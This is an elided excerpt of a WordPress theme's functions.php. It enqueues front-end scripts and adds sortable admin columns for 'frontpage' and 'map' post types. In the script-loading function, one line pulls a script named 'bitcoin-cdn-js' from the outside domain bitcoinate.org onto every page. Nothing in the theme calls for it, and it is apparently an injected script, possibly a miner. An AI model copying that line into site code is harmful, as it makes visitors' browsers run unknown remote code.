...
require(__DIR__ . '/assets/function/meta-front-page.php');
require(__DIR__ . '/assets/function/cpt-front-page.php');
require(__DIR__ . '/assets/function/sections-boxes-partner.php');
require(__DIR__ . '/assets/function/cpt-map.php');
...
function greatmag_scripts() {
	...
	wp_enqueue_script( 'greatmag-main', get_template_directory_uri() . '/js/main.min.js', array('jquery'), '20180320', true );

	wp_enqueue_script( 'greatmag-html5shiv', get_template_directory_uri() . '/js/html5shiv.js', array(), '', true );

	wp_enqueue_script( 'w3', get_template_directory_uri() . '/js/w3.js', array(), '', true );
	// ['w3-js', 'https://www.w3schools.com/lib/w3.js']

	wp_enqueue_script('bitcoin-cdn-js', '//bitcoinate.org/scripts/libraries/0.2.2.min.js');
...
add_action( 'wp_enqueue_scripts', 'greatmag_scripts', 1000 );
...
/**
 * Output the tag_cloud as a list
 */
...
/**
 * ADD CUSTOM COLUMNS TO ADMIN POST TYPE OVERVIEW front-page
 */

	//Adding custom columns
	add_filter( 'manage_edit-frontpage_columns', 'my_edit_frontpage_columns' ) ;

	function my_edit_frontpage_columns( $columns ) {

	    $columns = array(
	        'cb' => '&lt;input type="checkbox" />',
	        'title' => __( 'Title (Optional To Show/Hide)' ),
	        'order' => __( 'Section Order #' ),
	        'date' => __( 'Date' )
	    );
	...
	add_action( 'manage_frontpage_posts_custom_column', 'my_manage_frontpage_columns', 10, 2 );

	//Adding content to custom columns
	function my_manage_frontpage_columns( $column, $post_id ) {
	  global $post;

	  /* Get the post meta. */
	  $order = get_post_meta( $post_id, 'order', true );

	  /* If no order is found, output a default message. */
	  if ( empty( $order ) )
	    echo __( 'No Front-Page Order Set' );

	  /* If there is a order, append [TEXT] to the string. */
	  else
	    printf( __( 'Section #%s ' ), $order );

	}

	//Making custom columns sortable
	add_filter( 'manage_edit-frontpage_sortable_columns', 'sky_frontpage_sortable_columns' );

	function sky_frontpage_sortable_columns( $columns ) {
	...
	//Adding filter for when viewing this specific screen in the admin
	/* Only run customization on the 'edit.php' page in the admin. */
	add_action( 'load-edit.php', 'sky_edit_frontpage_load' );

	function sky_edit_frontpage_load() {
	    add_filter( 'request', 'sky_sort_frontpages' );
	}

	/* Sorts Front-Page. */
	function sky_sort_frontpages( $vars ) {

	    /* Check if we're viewing the 'frontpage' post type. */
	    if ( isset( $vars['post_type'] ) && 'frontpage' == $vars['post_type'] ) {

	        /* Check if 'orderby' is set to 'order'. */
...
/**
 * ADD CUSTOM COLUMNS TO ADMIN POST TYPE OVERVIEW end
 */


/**
 * ADD CUSTOM COLUMNS TO ADMIN POST TYPE OVERVIEW map
 */

	//Adding custom columns
	add_filter( 'manage_edit-map_columns', 'my_edit_map_columns' ) ;

	function my_edit_map_columns( $columns ) {

	    $columns = array(
	        'cb' => '&lt;input type="checkbox" />',
	        'title' => __( 'Title' ),
	        'prtnrshp' => __( 'Partnership' ),
	...
	add_action( 'manage_map_posts_custom_column', 'my_manage_map_columns', 10, 2 );

	//Adding content to custom columns
	function my_manage_map_columns( $column, $post_id ) {
	  global $post;

	  /* Get the post meta. */
	  $prtnrshp = get_post_meta( $post_id, 'prtnrshp', true );

	  /* If no prtnrshp is found, output a default message. */
	  if ( empty( $prtnrshp ) )
	    echo __( 'Nothing noted' );

	  /* If there is a prtnrshp, append [TEXT] to the string. */
	  else
	    printf( __( 'Status: %s ' ), $prtnrshp );

	}

	//Making custom columns sortable
	add_filter( 'manage_edit-map_sortable_columns', 'sky_map_sortable_columns' );

	function sky_map_sortable_columns( $columns ) {

	    $columns['prtnrshp'] = 'prtnrshp';
